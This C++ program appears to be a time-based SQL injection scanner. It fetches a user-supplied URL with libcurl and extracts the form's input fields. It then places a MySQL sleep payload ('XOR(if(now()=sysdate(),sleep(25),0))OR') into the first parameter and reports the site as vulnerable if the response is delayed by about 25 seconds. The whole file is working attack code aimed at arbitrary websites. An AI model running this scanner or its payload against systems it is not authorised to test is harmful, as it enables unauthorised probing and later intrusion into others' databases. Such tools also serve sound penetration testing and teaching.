#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <curl/curl.h>
#include <sstream>
#include <chrono>
#include <tuple>
using namespace std;
// Callback function to store response data
size_t WriteCallback(char *ptr, size_t size, size_t nmemb, std::string *userdata)
{
    size_t len = size * nmemb;
    userdata->append(ptr, len);
    return len;
}
std::string get_attribute_value(const std::string& tag, const std::string& attr_name)
{
    // Find the position of the attribute name in the tag
    size_t attr_pos = tag.find(attr_name);
    if (attr_pos == std::string::npos)
    {
        // Attribute not found
        return "";
    }

    // Find the value of the attribute
    size_t value_pos = tag.find("=", attr_pos);
    if (value_pos == std::string::npos)
    {
        // Attribute value not found
        return "";
    }

    // Skip the "=" character and any whitespace
    value_pos = tag.find_first_not_of(" \t", value_pos + 1);
    if (value_pos == std::string::npos)
    {
        // Attribute value not found
        return "";
    }

    // Find the end of the attribute value
    size_t value_end_pos = value_pos;
    if (tag[value_pos] == '\"' || tag[value_pos] == '\'')
    {
        // Attribute value is enclosed in quotes
        char quote_char = tag[value_pos];
        value_end_pos = tag.find(quote_char, value_pos + 1);
        if (value_end_pos == std::string::npos)
        {
            // Attribute value not properly terminated
            return "";
        }
    }
    else
    {
        // Attribute value is not enclosed in quotes
        value_end_pos = tag.find_first_of(" \t", value_pos);
        if (value_end_pos == std::string::npos)
        {
            // Attribute value extends to the end of the tag
            value_end_pos = tag.size();
        }
    }

    // Extract the attribute value and return it
    return tag.substr(value_pos+1, value_end_pos - value_pos-1);
}

// Extract parameters from an HTML file
std::vector<std::tuple<std::string, std::string, std::string>> extract_parameters(const std::string html)
{
    // Open the HTML file


    // Read the contents of the file into a string

    // Find all input tags in the HTML string
    std::vector<std::tuple<std::string, std::string, std::string>> params;
    size_t pos = 0;
    while ((pos = html.find("<input", pos)) != std::string::npos)
    {
        // Extract the tag and find the value of the "name", "type", and "value" attributes
        std::string tag = html.substr(pos, html.find(">", pos) - pos + 1);
        std::string name = get_attribute_value(tag, "name");
        std::string type = get_attribute_value(tag, "type");
        std::string value = get_attribute_value(tag, "value");
        if (!name.empty())
        {
            params.emplace_back(name, type, value);
        }
        pos += tag.size();
    }

    // Return the parameter names, types, and values
    return params;
}
string sendHttpRequest(string url)
{
    string response;
    CURL *curl = curl_easy_init();
    if (!curl)
    {
        std::cerr << "Failed to initialize curl\n";
        return "";
    }
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    curl_easy_setopt(curl, CURLOPT_HEADERDATA, NULL);
    curl_easy_setopt(curl, CURLOPT_HEADER, 1);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK)
    {
        std::cerr << "Failed to perform curl request: " << curl_easy_strerror(res) << "\n";
        curl_easy_cleanup(curl);
        return "";
    }

    if (response.empty())
    {
        std::cerr << "Empty response data\n";
    }
    curl_easy_cleanup(curl);
    return response;


}
int main()
{

    int testingtime=25;
    std::string payload="'XOR(if(now()=sysdate(),sleep("+to_string(testingtime)+"),0))OR'";
    std::string successmessage="exists";
    std::string errormessage="MISSING";
    bool vulnerable=false;

    std::string response;

    std::string url;
    std::cin>> url;
    cout << "Performing time based SQL injection\n";

    response=sendHttpRequest(url);
    std::vector<std::tuple<std::string, std::string, std::string>> params = extract_parameters(response);

    std::string url1=url;
    url1+="?";
    int cnt=1;
    for (const auto& param : params)
    {
        // std::cout <<"Enter the value of " <<get<0>(param) << "\n";
        std::string para="";
        if(cnt==1)
        {
            url1+=get<0>(param)+"="+payload;
            cnt++;
        }
        else if(std::get<1>(param)=="submit"&&std::get<0>(param).length()!=0&&std::get<2>(param).length()!=0)
        {
            url1+="&"+get<0>(param)+"="+get<2>(param);
        }
        else if(std::get<1>(param)=="submit"&&std::get<0>(param).length()!=0&&std::get<2>(param).length()==0)
        {
            url1+="&"+get<0>(param)+"="+"Submit";
        }
        else
        {
            url1+="&"+get<0>(param)+"="+para;
            cnt++;
        }
    }
    std::cout << url1 << "\n";


    auto start_time= std::chrono::high_resolution_clock::now();
    response=sendHttpRequest(url1);

    auto end_time= std::chrono::high_resolution_clock::now();
    auto duration= std::chrono::duration_cast<std::chrono::milliseconds>(end_time-start_time);
    long long int time=duration.count();
    std::cout <<"Time taken: "<<time<<"miliseconds"<< std::endl;

    //std::cout << "Response: " << response << "\n";
    if(time<=(testingtime+1)*1000L&&time>=(testingtime-1)*1000L)
    {
        vulnerable=true;
    }
    if(vulnerable)
    {
        std::cout << "The website is vulnerable to Timebased SQL injection\n";
    }
    else std::cout << "The website is not vulnerable.Sorry we can not do any further work\n";


   return 0;
}


